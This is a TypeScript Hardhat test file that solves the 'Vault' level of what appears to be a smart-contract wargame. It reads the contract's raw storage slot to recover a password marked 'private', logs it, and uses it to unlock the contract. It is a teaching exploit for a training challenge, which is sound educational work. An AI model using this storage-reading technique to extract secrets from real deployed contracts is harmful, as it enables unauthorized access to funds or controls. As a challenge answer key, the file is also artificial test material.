import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";
import { HexString } from "../typings/global";
import { TestOptions, setupChallenge, submitLevel } from "./utils";
import { VAULT_LEVEL_ADDRESS } from "./constants";

/**
 * The password is stored in the contract storage with `private` visibility modifier.
 * The `private` only means that other contract cannot read it, but we can because everything in the blockchain is public
 *
 * Storage slots:
 * @see: https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/
 */

/**
 * Converts hex strings to UTF-8
 */
const hexToString = (hexString: HexString) => {
  const hexNoPrefix = hexString.slice(2);
  return Buffer.from(hexNoPrefix, "hex").toString("utf-8");
};

describe("Vault", () => {
  let challenge: Contract; // challenge contract

  before(async () => {
    const contractLevel = VAULT_LEVEL_ADDRESS;
    const contractName = "Vault";
    const options: TestOptions = { contractName };
    ({ challenge } = await setupChallenge(contractLevel, options));
  });

  it("solves the challenge", async () => {
    expect(await challenge.locked()).to.equal(true);

    // grab data from storage - slot 0 is locked, slot 1 is the password
    const data = await ethers.provider?.getStorageAt(challenge.address, 1);
    if (data) {
      console.log(`Password found: ${hexToString(data)}`);
      await challenge.unlock(data);
    }

    expect(await challenge.locked()).to.equal(false);
  });

  after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
  });
});
